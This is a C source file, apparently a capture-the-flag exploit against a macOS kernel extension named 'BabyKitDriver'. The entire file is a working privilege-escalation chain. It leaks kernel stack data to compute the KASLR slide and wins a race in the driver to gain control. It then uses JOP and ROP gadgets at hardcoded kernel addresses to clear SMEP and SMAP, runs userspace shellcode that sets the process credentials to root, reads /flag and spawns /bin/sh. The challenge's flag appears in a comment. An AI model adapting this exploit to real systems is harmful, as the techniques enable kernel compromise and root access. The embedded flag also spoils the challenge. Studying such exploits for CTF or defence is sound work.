#include <IOKit/IOKitLib.h>
#include <inttypes.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/mman.h>

extern char **environ;

#define PFX "BabyKitDriver: "

static void __die_errno(const char *path, int line, const char *msg);

#define die_errno(msg) __die_errno(__FILE__, __LINE__, msg)

#define check_syscall(x)                                                       \
  ({                                                                           \
    typeof(x) __x = x;                                                         \
    if (__x == (typeof(x))-1) {                                                \
      die_errno(#x);                                                           \
    }                                                                          \
    __x;                                                                       \
  })

static void exec_shell(void) {
  char bin_sh[] = "/bin/sh";
  char *argv[] = {bin_sh, NULL};

  fprintf(stderr, PFX "exec(%s)\n", bin_sh);
  check_syscall(execve(argv[0], argv, environ));
}

static void __die_errno(const char *path, int line, const char *msg) {
  fprintf(stderr, PFX "%s:%d: ", path, line);
  perror(msg);
  exec_shell();
}

static void __die(const char *path, int line, const char *msg) {
  fprintf(stderr, PFX "%s:%d: %s\n", path, line, msg);
  exec_shell();
}

#define assert(x)                                                              \
  do {                                                                         \
    if (!(x)) {                                                                \
      __die(__FILE__, __LINE__, "Assertion failed: " #x);                      \
    }                                                                          \
  } while (0)

#define BABY_READ 0
#define BABY_LEAVE_MESSAGE 1

static kern_return_t baby_read(io_connect_t connect, void *p, size_t n) {
  uint64_t args[] = {(uint64_t)p, n};
  return IOConnectCallScalarMethod(connect, BABY_READ, args,
                                   sizeof(args) / sizeof(args[0]), NULL, NULL);
}

#define V1 0
#define V2 1

static kern_return_t baby_leave_message(io_connect_t connect, uint64_t is_v2,
                                        void *p, size_t n) {
  uint64_t args[] = {is_v2, (uint64_t)p, n};
  return IOConnectCallScalarMethod(connect, BABY_LEAVE_MESSAGE, args,
                                   sizeof(args) / sizeof(args[0]), NULL, NULL);
}

struct reader_thread {
  pthread_t thread;
  volatile bool stop;
  volatile bool started;
  io_connect_t connect;
  uint64_t buf[0x1000 / sizeof(uint64_t)];
};

static void *reader_thread_func(void *arg) {
  struct reader_thread *t = arg;
  t->started = true;
  do {
    baby_read(t->connect, t->buf, sizeof(t->buf));
  } while (!t->stop);
  return NULL;
}

static void reader_thread_start(struct reader_thread *t, io_connect_t connect) {
  t->stop = false;
  t->started = false;
  t->connect = connect;
  memset(t->buf, 0, sizeof(t->buf));
  assert(pthread_create(&t->thread, NULL, &reader_thread_func, t) == 0);
  while (!t->started) {
  }
}

static void reader_thread_stop(struct reader_thread *t) {
  t->stop = true;
  assert(pthread_join(t->thread, NULL) == 0);
}

#define abs_is_io_connect_method 0xFFFFFF8000A76D2E
#define dark_matter 0xdc000

static uint64_t default_payload(uint64_t i) {
  return i | (i << 8) | (i << 16) | (i << 24) | (i << 32) | (i << 40) |
         (i << 48);
}

#define X86_CR4_SMEP_BIT 20
#define X86_CR4_SMAP_BIT 21

#define abs_current_proc 0xFFFFFF8000989860
#define abs_proc_ucred 0xFFFFFF80008556B0
#define abs_posix_cred_get 0xFFFFFF800081C440
#define abs_return_to_user 0xFFFFFF8000335730
#define abs_proc_update_label 0xFFFFFF8000855DA0
#define abs_kauth_cred_setresuid 0xFFFFFF800081E320
#define abs_current_thread 0xFFFFFF80004D1ED0

static uint64_t vm_kernel_slide;
#define resolve(p) ((p) + vm_kernel_slide + dark_matter)

struct posix_cred {
  uint32_t cr_uid;
  uint32_t cr_ruid;
  uint32_t cr_svuid;
};

typedef struct ucred *kauth_cred_t;
typedef struct proc *proc_t;
struct update_cred_t {
  void *pad[2];
  kauth_cred_t (*fn)(struct update_cred_t *, kauth_cred_t);
};

static kauth_cred_t update_cred(struct update_cred_t *self, kauth_cred_t cred) {
  (void)self;
  kauth_cred_t (*kauth_cred_setresuid)(kauth_cred_t cred, uid_t ruid,
                                       uid_t euid, uid_t svuid, uid_t gmuid) =
      (void *)resolve(abs_kauth_cred_setresuid);

  return kauth_cred_setresuid(cred, 0, 0, 0, 0);
}

static uint64_t leak109;

__attribute__((noreturn)) void shellcode_c(uint64_t *kernel_stack) {
  while (*kernel_stack != leak109) {
    kernel_stack--;
  };
  kernel_stack -= 109; /* points to buf_v2 */
  kernel_stack -= 21;  /* points to return address */
  struct proc *(*current_proc)(void) = (void *)resolve(abs_current_proc);
  struct proc *proc = current_proc();
  bool (*proc_update_label)(proc_t, bool, struct update_cred_t *) =
      (void *)resolve(abs_proc_update_label);
  struct update_cred_t update_cred_data = {.fn = update_cred};
  proc_update_label(proc, true, &update_cred_data);
  asm(/* restore stack */
      "mov %[kernel_stack],%%rsp\n"
      /* restore frame pointer */
      "leaq 0x3b0+8(%%rsp),%%rbp\n"
      /* make copyout do nothing */
      "movq $0,-0x398(%%rbp)\n"  /* len */
      /* for _is_io_connect_method + 0x3df */
      "movq $0,%%r14\n"
      /* resume the kext */
      "ret" ::[kernel_stack] "r"(kernel_stack));
  __builtin_trap();
}

char tmp_stack[0x4000];
void shellcode(void);
asm("_shellcode:\n"
    "movq %gs:0,%rax\n"                     /* current_cpu_datap() */
    "movq 56(%rax),%rdi\n"                  /* ->cpu_kernel_stack */
    "leaq _tmp_stack+0x4000-8(%rip),%rsp\n" /* switch to temporary stack */
    "jmp _shellcode_c");

int main(void) {
  io_iterator_t iterator;
  assert(IOServiceGetMatchingServices(kIOMasterPortDefault,
                                      IOServiceMatching("BabyKitDriver"),
                                      &iterator) == KERN_SUCCESS);
  io_service_t service = IOIteratorNext(iterator);
  assert(service != IO_OBJECT_NULL);
  io_connect_t connect;
  assert(IOServiceOpen(service, mach_task_self(), 0, &connect) ==
         kIOReturnSuccess);
  IOObjectRelease(iterator);

  char *p = mmap(NULL, PAGE_SIZE * 2, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  assert(p != MAP_FAILED);
  assert(mprotect(p + PAGE_SIZE, PAGE_SIZE, PROT_NONE) == 0);

  baby_leave_message(connect, V2, NULL, 0);
  uint64_t stack_leak[0x1000 / sizeof(uint64_t)];
  memset(stack_leak, 0, sizeof(stack_leak));
  baby_read(connect, stack_leak, -1);
  for (size_t i = 0; i < sizeof(stack_leak) / sizeof(stack_leak[0]); i++) {
    if (stack_leak[i]) {
      fprintf(stderr, PFX "leak[%zu] = 0x%" PRIx64 "\n", i, stack_leak[i]);
    }
  }
  leak109 = stack_leak[109];
  vm_kernel_slide = leak109 - abs_is_io_connect_method - dark_matter;
  fprintf(stderr, PFX "vm_kernel_slide = 0x%" PRIx64 "\n", vm_kernel_slide);
#define resolve(p) ((p) + vm_kernel_slide + dark_matter)

  /*
   * Leak the message address.
   *
   * We get control by jumping to kaboom with rdi pointing to buf_v2 and rsi
   * pointing to drv->message->v2.buf.
   *
   * __text:FFFFFF800035200A                 mov     [rdi+8], rsi
   * __text:FFFFFF800035200E                 retn
   */
  uint64_t *kaboom = (uint64_t *)(p + PAGE_SIZE - sizeof(uint64_t));
  *kaboom = resolve(0xFFFFFF800035200AULL);
  fprintf(stderr, PFX "kaboom = 0x%" PRIx64 "\n", *kaboom);

  uint64_t payload_kva = -1;
  while (true) {
    baby_leave_message(connect, V2, NULL, 0);
    struct reader_thread t;
    reader_thread_start(&t, connect);
    baby_leave_message(connect, V1, kaboom, 0);
    reader_thread_stop(&t);
    if (t.buf[1]) {
      payload_kva = t.buf[1];
      break;
    }
  }
  fprintf(stderr, PFX "payload_kva = 0x%" PRIx64 "\n", payload_kva);

  /*
   * Use the following JOP gadgets for stack pivot.
   *
   * __text:FFFFFF8000525C27                 mov     rbx, rsi
   * __text:FFFFFF8000525C2A                 mov     rdi, [rsi+8]
   * __text:FFFFFF8000525C2E                 call    qword ptr [rsi]
   *
   * __text:FFFFFF8000A1AF80                 mov     rax, [rbx+50h]
   * __text:FFFFFF8000A1AF84                 test    rax, rax
   * __text:FFFFFF8000A1AF87                 jz      short loc_FFFFFF8000A1AFA1
   * __text:FFFFFF8000A1AF89                 cmp     dword ptr [rbx+48h], 11h
   * __text:FFFFFF8000A1AF8D                 jnz     short loc_FFFFFF8000A1AFA1
   * __text:FFFFFF8000A1AF8F                 mov     rdi, [rbx+58h]
   * __text:FFFFFF8000A1AF93                 mov     rsi, [rbx+60h]
   * __text:FFFFFF8000A1AF97                 call    rax
   *
   * __text:FFFFFF80003351B3                 mov     rsp, rsi
   * __text:FFFFFF80003351B6                 call    rdi
   */
  *kaboom = resolve(0xFFFFFF8000525C27ULL);
  fprintf(stderr, PFX "kaboom = 0x%" PRIx64 "\n", *kaboom);
  uint64_t payload[0x200 / sizeof(uint64_t)];
  for (uint64_t i = 0; i < sizeof(payload) / sizeof(payload[0]); i++) {
    payload[i] = default_payload(i);
  }
#define set_payload(o, v) payload[(o) / sizeof(uint64_t)] = (v)
  set_payload(0, resolve(0xFFFFFF8000A1AF80ULL));
  set_payload(0x50, resolve(0xFFFFFF80003351B3ULL));
  set_payload(0x48, 0x11);
  set_payload(0x58, resolve(0xFFFFFF8000351E89ULL));
  set_payload(0x60, payload_kva + 0x70);

  /*
   * Use the following ROP gadgets to turn off SMAP and SMEP and jump to
   * shellcode in userspace:
   *
   * __text:FFFFFF8000351E89                 pop     rcx
   * __text:FFFFFF8000351E8A                 retn
   *
   * __text:FFFFFF8000351E89                 pop     rcx
   * __text:FFFFFF8000351E8A                 retn
   *
   * __text:FFFFFF80004BD726                 mov     rax, cr4
   * __text:FFFFFF80004BD729                 mov     [rcx], rax
   * __text:FFFFFF80004BD72C                 pop     rbp
   * __text:FFFFFF80004BD72D                 retn
   *
   * __text:FFFFFF8000351E89                 pop     rcx
   * __text:FFFFFF8000351E8A                 retn
   *
   * __text:FFFFFF8000458FBD                 and     rax, rcx
   * __text:FFFFFF8000458FC0                 pop     rbp
   * __text:FFFFFF8000458FC1                 retn
   *
   * __text:FFFFFF80004B017C                 mov     cr4, rax
   * __text:FFFFFF80004B017F                 pop     rbp
   * __text:FFFFFF80004B0180                 retn
   */
  set_payload(0x70, resolve(0xFFFFFF8000351E89));
  set_payload(0x78, payload_kva + 0x1f8);
  set_payload(0x80, resolve(0xFFFFFF80004BD726));
  set_payload(0x90, resolve(0xFFFFFF8000351E89));
  set_payload(0x98, ~((1ULL << X86_CR4_SMEP_BIT) | (1ULL << X86_CR4_SMAP_BIT)));
  set_payload(0xa0, resolve(0xFFFFFF8000458FBD));
  set_payload(0xb0, resolve(0xFFFFFF80004B017C));
  set_payload(0xc0, (uint64_t)shellcode);

  for (size_t i = 0; i < sizeof(payload) / sizeof(payload[0]); i++) {
    if (payload[i] != default_payload(i)) {
      fprintf(stderr, PFX "payload[%zu] = 0x%" PRIx64 "\n", i, payload[i]);
    }
  }
  baby_leave_message(connect, V2, payload, sizeof(payload));

  while (true) {
    seteuid(0);
    setuid(0);

    /* flag{7ac21f7848a39f0aea63fa29d304226a} */
    char flag_buf[128];
    int fd = open("/flag", O_RDONLY);
    if (fd != -1) {
      ssize_t n = read(fd, flag_buf, sizeof(flag_buf));
      if (n > 0) {
        write(STDOUT_FILENO, flag_buf, n);
        write(STDOUT_FILENO, "\n", 1);
      }
      close(fd);
    }

    if (geteuid() == 0) {
      exec_shell();
    }

    /* Make sure tmp_stack is paged in. */
    memset(tmp_stack, 0, sizeof(tmp_stack));
    baby_leave_message(connect, V2, NULL, 0);
    struct reader_thread t;
    reader_thread_start(&t, connect);
    baby_leave_message(connect, V1, kaboom, 0);
    reader_thread_stop(&t);
  }
}
